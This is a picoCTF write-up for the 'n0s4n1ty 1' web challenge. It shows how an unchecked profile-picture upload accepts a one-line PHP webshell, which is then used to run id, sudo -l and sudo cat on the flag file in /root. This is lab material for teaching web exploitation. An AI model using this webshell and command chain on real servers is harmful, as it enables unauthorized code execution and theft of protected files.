# n0s4n1ty 1 #

## Overview ##

100 points

Category: [Web Exploitation](../)

Tags: `#webexploitation #fileupload #webshell #php #sanitisation`

## Description ##

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory. 
You can access the web application here!

## Approach ##

Opening the challenge link in a browser we see an `Browse...` button to browse to a local image to upload as a new profile photo or avatar. An `Upload Profile` button submits the request.

Continuing to explore the challenge website functionality, uploading a dummy image file `dummy.png` yields the following response:

    The file dummy.png has been uploaded Path: uploads/dummy.png 

This informs us of where our uploaded file has been saved on the server, so trying to navigate directly to this file, by appending `uploads/dummy.png` to our URL, we see our dummy image file.

    http://standard-pizzas.picoctf.net:61657/uploads/dummy.png

So, if the website is not properly sanity checking (reference to the challenge name) our uploaded file, possibly we could upload and navigate to a file that is not an image, but perhaps PHP code?

Creating a simple webshell PHP source file `webshell.php` that uses a `cmd` query string parameter and issues a `system()` call with the value of this parameter:

    $ echo "<?php system(\$_GET['cmd']); ?>" > webshell.php

    $ cat webshell.php 
    <?php system($_GET['cmd']); ?>

Upload this `webshell.php` source file as a "profile image".

Test the web shell with a simple command (in this case `id` command) using the URL and query string as a `GET` request, to confirm everything is working as suspected:

    http://standard-pizzas.picoctf.net:61657/uploads/webshell.php?cmd=id

Response:

    uid=33(www-data) gid=33(www-data) groups=33(www-data) 

Confirming successful execution of our uploaded PHP webshell code.

Using our uploaded webshell code we can now issue `system()` commands to locate and drop the challenge flag.

Request to list the contents of the current folder:

    http://standard-pizzas.picoctf.net:61657/uploads/webshell.php?cmd=ls

Response:

    webshell.php

The challenge description states the flag resides within the `/root` folder, so lets try listing it's contents:

    http://standard-pizzas.picoctf.net:61657/uploads/webshell.php?cmd=ls%20/root

An empty response, due more likely to insufficient privileges to list the contents of `/root`, so lets check the lit of allowed `sudo` commands:

    http://standard-pizzas.picoctf.net:61657/uploads/webshell.php?cmd=sudo%20-l

Response:

    Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL

Which indicates we can run any command, so lets try and list the contents of `/root` again, however this time via `sudo`:

    http://standard-pizzas.picoctf.net:61657/uploads/webshell.php?cmd=sudo%20ls%20/root

Response:

    flag.txt

There's our flag.

## Solution ##

Using the upload webshell detailed in the approach section of this write up, we can dump the contents of the flag file using the `cat` command with `sudo` to allow access.

Request:

    http://standard-pizzas.picoctf.net:61657/uploads/webshell.php?cmd=sudo%20cat%20/root/flag.txt

Response:

    picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.
